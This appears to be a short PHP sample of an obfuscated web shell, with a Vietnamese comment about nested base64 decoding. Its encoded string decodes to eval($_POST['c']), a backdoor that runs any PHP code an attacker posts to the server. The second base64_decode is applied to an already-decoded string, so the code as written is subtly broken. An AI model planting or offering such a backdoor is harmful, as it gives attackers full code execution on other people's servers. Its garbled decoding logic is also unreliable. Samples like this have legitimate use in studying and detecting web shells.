<?php
// base64_decode lồng nhiều lớp
$c = base64_decode('ZXZhbCgkX1BPU1RbJ2MnXSk7');  // eval($_POST['c']);
eval(base64_decode($c));
?>
